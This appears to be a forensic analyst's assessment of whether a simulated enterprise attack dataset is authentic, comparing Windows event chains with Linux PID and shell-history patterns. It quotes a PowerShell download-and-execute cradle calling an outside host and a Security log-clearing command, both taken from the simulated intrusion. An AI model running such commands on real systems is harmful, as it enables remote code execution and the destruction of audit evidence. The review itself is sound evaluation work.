# Host/EDR Forensics Analyst — Authenticity Assessment

## Verdict

**Assessment:** Synthetic
**Confidence:** 72

## Executive Summary

The Windows Security/Sysmon and eCAR attack timeline is unusually strong and often source-native: process creation, service install, log clear, and network events line up plausibly. I would not call this synthetic from the Windows telemetry alone, but the Linux/EDR side shows repeated process-ID allocation behavior and shell-history patterns that feel generated rather than collected from live hosts.

## Evidence For Synthetic

- Linux eCAR process PIDs move backward repeatedly within the visible window without wraparound. Example: `APP-INT-01.meridianhcs.local/ecar.json` has `/usr/bin/last` PID `838581` at `2024-03-18T12:04:31.931Z`, then `/usr/sbin/ip` PID `838288` at `12:07:15.611Z`; that host has 62 such inversions across 187 process creates.
- The same PID pattern appears across Linux hosts: `DB-PROD-01` has 51 inversions across 162 creates, `WEB-EXT-01` has 48 across 180, and `PROXY-01` has 29 across 108. Normal Linux PID allocation should be mostly increasing absent PID wrap or heavy delayed telemetry ordering.
- Several shell histories feel deliberately “humanized” rather than organically messy: isolated typos such as `journactl` in `APP-INT-01/.../marcus.chen.bash_history`, `uilmit` in `WEB-EXT-01/.../marcus.chen.bash_history`, and `eu` in `WEB-EXT-01/.../aisha.johnson.bash_history` are not followed by immediate correction.
- Linux command activity has a sampler-like quality across unrelated systems: users repeatedly run broad diagnostics such as `resolvectl`, `bluetoothctl devices`, `tail ~/.xsession-errors`, `systemctl status`, `ip -br addr`, and `df -h` on servers where those checks are only loosely contextual.
- eCAR process lifecycle is very clean for short-lived Linux commands, with near-perfect create/terminate pairing and low artifact loss despite many hosts and shell sessions.

## Evidence For Real

- The DC compromise chain is highly plausible. `DC-01` shows `PSEXESVC` service creation at `2024-03-18T16:00:12Z` in Security event `4697`, with matching Sysmon/eCAR file and process evidence.
- The log-clear sequence is source-native. Security event `4688` records `wevtutil cl Security` at `2024-03-18T17:41:41.921Z`, followed by Security `1102` at `17:41:42.809Z`, with EventRecordID resetting afterward; Sysmon and eCAR also show `wevtutil.exe` create/terminate.
- The encoded PowerShell execution on `DC-01` is coherent across sources: Security/Sysmon/eCAR show PID `6676`, parent `C:\Windows\PSEXESVC.exe`, outbound proxy traffic to `10.10.3.20:8080`, and the decoded command is `IEX (New-Object Net.WebClient).DownloadString("https://api.westbridge-services.net/v2/manifest")`.
- Workstation process trees look believable. `WS-AJOHNSON-01` launches `mstsc.exe /v:DC-01` from `explorer.exe` at `2024-03-18T12:14:08Z`, followed by Sysmon network event to `10.10.2.10:3389` at `12:14:11Z`.
- Linux shell redirection handling is realistic in places: `DB-PROD-01` bash history shows `mysqldump ... > /tmp/rpt_0318.sql`, while eCAR correctly records the process command without shell redirection and separately records file creation for `/tmp/rpt_0318.sql`.

## Detailed Analysis

The Windows endpoint evidence is the strongest portion of the dataset. Security event IDs, Sysmon event IDs, process IDs, and command lines form credible chains. The DC attack sequence includes PsExec-style service creation, domain account creation (`svc_mhsync`), group membership addition to `Domain Admins`, scheduled task persistence, encoded PowerShell execution, proxy egress, and later cleanup. These are not just present as isolated indicators; they line up with parent process context and plausible timestamps.

The DC Security log clear is especially convincing. The sequence from `powershell.exe` to `wevtutil.exe` to event `1102` is source-native, and the EventRecordID reset after `1102` is exactly the sort of artifact I expect after a Security log clear. I do not see an impossible ordering in that chain.

The Windows user activity also has reasonable host texture. Workstations show ordinary update agents, browsers, VPN clients, Edge GPU children, Acrobat, Zoom/Dropbox/Google update tasks, RDP clients, and service-hosted background activity. Logon IDs are reused in plausible ways for unlock/RDP activity, and I did not find obvious logoff-before-logon contradictions for visible identifiers.

The Linux/EDR process model is where the dataset loses authenticity. Linux PIDs should generally rise over time on a running host until wraparound. In this data, each Linux host has PIDs constrained to a narrow host-specific band but assigned out of order dozens of times. A few inversions could be telemetry delay, but the repeated pattern across `APP-INT-01`, `DB-PROD-01`, `WEB-EXT-01`, and `PROXY-01` looks like deterministic synthetic PID selection.

The shell histories add to that impression. They are well-formatted and contain plausible administrator/user commands, but the mistakes and command choices feel curated. Typos appear as decorative one-offs instead of natural failed-command/correction pairs, and multiple users perform broad environment-probing commands across systems in a way that reads like generated “normal admin activity.”

## Realism Score by Category

- **Field format accuracy:** 8 — Windows Security/Sysmon fields are mostly source-native and detailed; Linux/eCAR is weaker around PID behavior.
- **Temporal patterns:** 6 — Attack chains and business-hour activity are plausible, but Linux PID/time progression is suspicious.
- **Cross-source correlation:** 8 — DC and RDP sequences correlate well across Security, Sysmon, eCAR, and Zeek without obvious impossible ordering.
- **Behavioral realism:** 6 — Windows behavior is convincing; shell histories and Linux admin activity feel partially templated.
- **Environmental consistency:** 7 — Host roles, users, services, and network paths are coherent, but endpoint process semantics are uneven.

## Recommendations

- Model Linux PID allocation per host as mostly monotonic, with realistic wrap/reuse only when justified by pid_max and elapsed process volume.
- Preserve a small amount of endpoint telemetry loss: missing terminations, delayed process events, and occasional unmatched shell-history commands would feel more natural.
- Make shell-history mistakes more organic: failed command, immediate correction, then follow-on work.
- Reduce repeated “diagnostic sampler” command patterns across unrelated Linux systems.
- Keep the Windows event-chain work; the PsExec, PowerShell, log-clear, and RDP correlations are the strongest realism elements in this dataset.
